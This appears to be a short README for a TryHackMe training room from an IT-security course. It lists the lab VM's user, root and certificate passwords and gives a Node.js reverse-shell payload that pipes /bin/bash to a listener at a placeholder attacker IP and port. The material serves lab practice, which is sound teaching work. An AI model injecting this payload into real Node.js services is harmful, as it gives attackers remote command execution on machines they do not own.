# thm_atdits
TryHackMe Room for Aktuelle Themen der IT-Sicherheit

## Login Data for the VM
```
paul
SicheresPasswort

root
IchMagZuege!

root cert pw
felix1
```

## Injection params for netcat
```
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(<Socket You are listenning on>, "<Your-IP>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```